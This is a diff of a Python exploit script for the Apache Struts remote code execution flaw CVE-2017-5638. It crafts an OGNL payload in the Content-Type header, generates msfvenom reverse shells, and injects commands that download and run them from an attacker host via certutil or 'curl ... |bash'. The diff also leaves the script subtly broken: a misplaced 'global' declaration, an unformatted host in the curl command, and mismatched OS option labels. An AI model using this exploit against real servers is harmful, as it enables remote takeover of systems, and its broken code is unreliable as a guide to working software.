@@ -1,20 +1,10 @@
 # Author (m4ud)
 # Apache Struts-045
 # CVE : 2017-5638
-
 import sys
 import requests
 from optparse import OptionParser
 import os
-import subprocess
-import http.server
-import threading
-import time
-
-
-def serverShutdown(server):
-	server.stop()
-	print("Shutting Server down!")
 
 
 class AS045:
@@ -26,8 +16,8 @@ class AS045:
 		self.osys = options.osys
 		self.lport = options.lport
 		self.lhost = options.lhost
-		self.wport = options.wport
-
+		cmd = self.command
+		#if self.target is not None and self.lport is not None:
 
 		if(len(sys.argv) < 3):
 			print('\n python3 exploit.py -h   ...for help')
@@ -42,37 +32,27 @@ class AS045:
 
 			def venom(shell, ext):
 				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ self.lport + " -f "+ ext+ " > shelb")
-			print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
-			print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
-			server_address = (self.lhost, int(self.wport))
-			self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
-			self.server_thread = threading.Thread(target=self.httpd.serve_forever).start()
-
-			def stop(self):
-				print("\r\n[+] Shutting Server down! [+]\r\n")
-				self.httpd.shutdown()
-				self.httpd.server_close()
-
+            
 #			proxies='http://127.0.0.1:8080'
 #			proxies = {'http' : proxies}
 			target = 'http://' + self.target #Vulnerable Server
 			print(target)
 			port = self.rport
 			directory = self.directory # Struts Application directory
-			cmd = self.command
-
 			if self.osys == "1":
 				shell = "windows"
 				ext = "exe"
 				venom(shell, ext)
 				os.system('mv shelb shelb.exe')
-				cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe & shelb.exe" % (self.lhost, self.wport)
-
+				global cmd
+				cmd = "certutil -urlcache -f -split http://%s/shelb.exe & shelb.exe" % self.lhost
 			if self.osys == "2":
 				shell = "linux"
 				ext = "elf"
 				venom(shell, ext)
+				global cmd
 				cmd = "curl http://%s/shelb |bash"
+
 
 			URL = target + ':' + port + '/' + directory + '/'
 
@@ -95,11 +75,11 @@ class AS045:
 			payload += "(#ros.flush())}"
 
 			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
+#			r = requests.get(URL, headers=headers, proxies=proxies)
 
-			f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
 			r = requests.get(URL, headers=headers)
-			stop(self)
-			f.communicate()
+			print(r.text)
+
 
 
 def main():
@@ -111,10 +91,8 @@ def main():
 	parser.add_option("-o", "--os", dest="osys", help="Choose OS: Linux = 1, Windows = 2")
 	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
 	parser.add_option("-P", "--lport", dest="lport", help="LPORT")
-	parser.add_option("-w", "--wport", dest="wport", default=4443, help="WPORT")
 	(options, args) = parser.parse_args() 
 	exploit = AS045(options) 
-
 if __name__=="__main__": 
 	main()
 
